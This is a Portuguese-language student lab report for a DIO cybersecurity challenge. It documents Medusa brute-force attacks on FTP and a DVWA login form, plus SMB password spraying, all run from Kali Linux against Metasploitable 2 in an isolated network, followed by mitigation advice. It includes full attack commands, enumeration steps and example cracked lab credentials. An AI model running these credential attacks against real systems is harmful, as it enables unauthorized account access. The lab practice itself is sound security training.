# Ataques de Força Bruta em Ambiente Controlado — Kali Linux + Medusa

Projeto prático desenvolvido como parte do desafio de cibersegurança da DIO, com o objetivo de simular ataques de força bruta em serviços de rede (FTP, aplicação web e SMB), usando exclusivamente ambientes intencionalmente vulneráveis em laboratório isolado, e propor medidas de mitigação para cada cenário.

> ⚠️ **Aviso legal e ético:** todos os testes aqui documentados foram realizados em uma rede isolada (host-only, sem acesso à internet ou a outras redes), contra máquinas virtuais criadas especificamente para fins educacionais (Metasploitable 2 e DVWA). Realizar esse tipo de ataque contra sistemas de terceiros sem autorização explícita é crime (no Brasil, enquadrado na Lei 12.737/2012 — "Lei Carolina Dieckmann" — e no Marco Civil da Internet). Este material tem finalidade exclusivamente didática.

---

## Sumário

1. [Objetivo](#objetivo)
2. [Ambiente de laboratório](#ambiente-de-laboratório)
3. [Configuração da rede](#configuração-da-rede)
4. [Reconhecimento inicial](#reconhecimento-inicial)
5. [Cenário 1 — Força bruta em FTP](#cenário-1--força-bruta-em-ftp)
6. [Cenário 2 — Ataque ao formulário de login (DVWA)](#cenário-2--ataque-ao-formulário-de-login-dvwa)
7. [Cenário 3 — Password Spraying em SMB](#cenário-3--password-spraying-em-smb)
8. [Wordlists utilizadas](#wordlists-utilizadas)
9. [Validação dos acessos obtidos](#validação-dos-acessos-obtidos)
10. [Medidas de mitigação](#medidas-de-mitigação)
11. [Principais aprendizados](#principais-aprendizados)
12. [Referências](#referências)

---

## Objetivo

Compreender, na prática, como funcionam ataques de força bruta e password spraying contra serviços comuns de infraestrutura (FTP, HTTP e SMB), utilizando o **Medusa** a partir do **Kali Linux**, contra alvos propositalmente vulneráveis (**Metasploitable 2** e **DVWA**). A partir dos resultados, documentar recomendações de mitigação aplicáveis a ambientes reais.

## Ambiente de laboratório

| Máquina | Função | Sistema | IP (rede interna) |
|---|---|---|---|
| Kali Linux | Máquina atacante | Kali Linux 2024.x | `192.168.56.101` |
| Metasploitable 2 | Alvo vulnerável (FTP, SMB) | Ubuntu 8.04 (propositalmente vulnerável) | `192.168.56.102` |
| DVWA | Alvo vulnerável (aplicação web) | Instalado na própria Metasploitable 2 ou VM separada com LAMP | `192.168.56.102` |

Ferramentas utilizadas:
- VirtualBox (hipervisor)
- Kali Linux (atacante)
- Medusa (força bruta)
- Nmap (reconhecimento)
- Navegador + Dev Tools (inspeção do formulário do DVWA)
- `enum4linux` / `smbclient` (enumeração SMB)

## Configuração da rede

Ambas as VMs foram configuradas em modo **Host-only Adapter** no VirtualBox, garantindo que o tráfego de ataque não saia da máquina física nem alcance a internet ou outras redes.

Passos:
1. **VirtualBox > Arquivo > Gerenciador de Rede Host-only** → criar uma rede (ex.: `vboxnet0`, faixa `192.168.56.0/24`).
2. Em cada VM: **Configurações > Rede > Adaptador 1 > Host-only Adapter** → selecionar a rede criada.
3. Confirmar os IPs com `ip a` (Kali) e `ifconfig` (Metasploitable 2 — usa `ifconfig` por ser um sistema mais antigo).
4. Testar conectividade: `ping 192.168.56.102` a partir do Kali.

> Veja capturas de tela em `/images/rede-hostonly.png` e `/images/ping-teste.png`.

## Reconhecimento inicial

Antes de qualquer ataque, mapeamos os serviços ativos no alvo:

```bash
nmap -sV -p- 192.168.56.102
```

Saída resumida esperada (Metasploitable 2 tem dezenas de serviços propositalmente abertos):

```
21/tcp   open  ftp     vsftpd 2.3.4
22/tcp   open  ssh     OpenSSH 4.7p1
139/tcp  open  netbios-ssn Samba smbd 3.X
445/tcp  open  netbios-ssn Samba smbd 3.X
80/tcp   open  http    Apache httpd 2.2.8
```

> Captura em `/images/nmap-scan.png`.

## Cenário 1 — Força bruta em FTP

Serviço: `vsftpd` na porta 21.

Comando utilizado:

```bash
medusa -h 192.168.56.102 -U wordlists/usuarios.txt -P wordlists/senhas.txt -M ftp
```

Parâmetros:
- `-h` → host alvo
- `-U` → wordlist de usuários
- `-P` → wordlist de senhas
- `-M` → módulo (`ftp`)

Resultado (exemplo):

```
ACCOUNT FOUND: [ftp] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS]
```

> Captura em `/images/medusa-ftp.png`.

## Cenário 2 — Ataque ao formulário de login (DVWA)

Serviço: aplicação web DVWA (nível de segurança **low**, propositalmente sem proteção contra força bruta).

Passos:
1. Acessar `http://192.168.56.102/dvwa/login.php` e logar uma vez manualmente com credencial inválida.
2. Usar o **Dev Tools (Network)** do navegador para identificar os campos do formulário (`username`, `password`, `Login`) e a mensagem de falha (ex.: `"Login failed"`), que servirá como sinal de tentativa malsucedida.
3. Copiar o cookie de sessão (`PHPSESSID`) e o cookie de nível de segurança (`security=low`).

Comando utilizado:

```bash
medusa -h 192.168.56.102 -U wordlists/usuarios.txt -P wordlists/senhas.txt \
  -M web-form \
  -m FORM:"/dvwa/login.php" \
  -m DENY-SIGNAL:"Login failed" \
  -m FORM-DATA:"username=&password=&Login=Login" \
  -c "PHPSESSID=<valor_da_sessao>; security=low"
```

Parâmetros do módulo `web-form`:
- `FORM` → caminho do endpoint de login
- `DENY-SIGNAL` → trecho de texto presente apenas quando o login falha
- `FORM-DATA` → mapeia os campos do formulário para `%USER%`/`%PASS%`
- `-c` → cookies necessários para manter a sessão/nível de segurança

Resultado (exemplo):

```
ACCOUNT FOUND: [web-form] Host: 192.168.56.102 User: admin Password: password [SUCCESS]
```

> Captura em `/images/medusa-dvwa.png`.

## Cenário 3 — Password Spraying em SMB

Diferente da força bruta tradicional (muitas senhas por usuário), o **password spraying** testa **poucas senhas comuns contra muitos usuários**, reduzindo o risco de bloqueio de conta por tentativas excessivas — uma técnica realista usada contra ambientes corporativos (Active Directory, por exemplo).

### Enumeração de usuários (antes do ataque)

```bash
enum4linux -U 192.168.56.102
```

ou, alternativamente:

```bash
smbclient -L //192.168.56.102 -N
```

Isso permite construir uma wordlist de usuários reais (`usuarios.txt`) em vez de adivinhar nomes.

### Password spraying com Medusa

```bash
medusa -h 192.168.56.102 -U wordlists/usuarios.txt -p "123456" -M smbnt
```

Note o `-p` (minúsculo) em vez de `-P`: aqui testamos **uma única senha fixa** contra **toda a lista de usuários**, que é a essência do spraying.

> Captura em `/images/medusa-smb.png`.

## Wordlists utilizadas

- [`wordlists/usuarios.txt`](wordlists/usuarios.txt) — nomes de usuário comuns e específicos do Metasploitable 2 (ex.: `msfadmin`).
- [`wordlists/senhas.txt`](wordlists/senhas.txt) — senhas fracas e previsíveis, incluindo a senha padrão do próprio Metasploitable 2.

Essas listas são propositalmente pequenas, para fins didáticos — em uma auditoria real, listas como `rockyou.txt` (já incluída no Kali) seriam utilizadas, com cautela quanto ao tempo de execução e ao risco de bloqueio de contas.

## Validação dos acessos obtidos

Após cada "ACCOUNT FOUND", validamos manualmente o acesso:

- **FTP:** `ftp 192.168.56.102` e login com a credencial encontrada.
- **DVWA:** login manual via navegador com a credencial encontrada.
- **SMB:** `smbclient //192.168.56.102/share -U usuario%senha`.

Essa etapa é importante para descartar falsos positivos (comuns em módulos web mal configurados).

## Medidas de mitigação

| Vetor | Vulnerabilidade observada | Mitigação recomendada |
|---|---|---|
| FTP | Credenciais fracas, serviço sem bloqueio de tentativas | Desabilitar FTP quando possível (usar SFTP/FTPS); política de senha forte; `fail2ban` para bloquear IPs após N tentativas |
| DVWA / login web | Sem limite de tentativas, sem CAPTCHA, sem MFA | Implementar *rate limiting*, bloqueio progressivo de conta, CAPTCHA após X tentativas, autenticação multifator (MFA) |
| SMB | Enumeração de usuários permitida; senhas fracas e reutilizadas | Desabilitar enumeração anônima (`restrict anonymous`), políticas de bloqueio de conta (*account lockout*), MFA, segmentação de rede |
| Geral | Falta de monitoramento | Centralizar logs (SIEM), alertas para múltiplas tentativas de login falhas, notificação de login suspeito |

Boas práticas transversais:
- Senhas longas e únicas (gerenciador de senhas) em vez de regras complexas e previsíveis.
- Autenticação multifator sempre que disponível — é a mitigação mais eficaz contra força bruta e spraying.
- *Account lockout* com janela de tempo (evitar DoS proposital, mas dificultar o ataque).
- Monitoramento e alertas (ex.: Fail2Ban, SIEM) para identificar padrões de ataque.
- Segmentação de rede e desativação de serviços legados desnecessários (ex.: SMBv1).

## Principais aprendizados

- Força bruta clássica (muitas senhas, um usuário) e password spraying (poucas senhas, muitos usuários) exigem abordagens de defesa diferentes — bloqueio de conta tradicional é menos eficaz contra spraying.
- Ataques a formulários web exigem entender a aplicação (campos, cookies, sinal de falha) antes de automatizar — não é um comando "genérico".
- Reconhecimento (Nmap, enumeração SMB) é etapa essencial antes de qualquer tentativa de força bruta — atacar "às cegas" é ineficiente e ruidoso.
- A ausência de MFA é, na prática, o fator que mais viabiliza esse tipo de ataque, independentemente do serviço.

## Referências

- [Medusa — Documentação oficial](http://www.foofus.net/jmk/medusa/medusa.html)
- [Kali Linux — Site oficial](https://www.kali.org/)
- [DVWA — Damn Vulnerable Web Application](http://www.dvwa.co.uk/)
- [Nmap — Manual oficial](https://nmap.org/book/)

---

**Autor:** L
**Projeto desenvolvido para o desafio de cibersegurança da DIO (Digital Innovation One).**
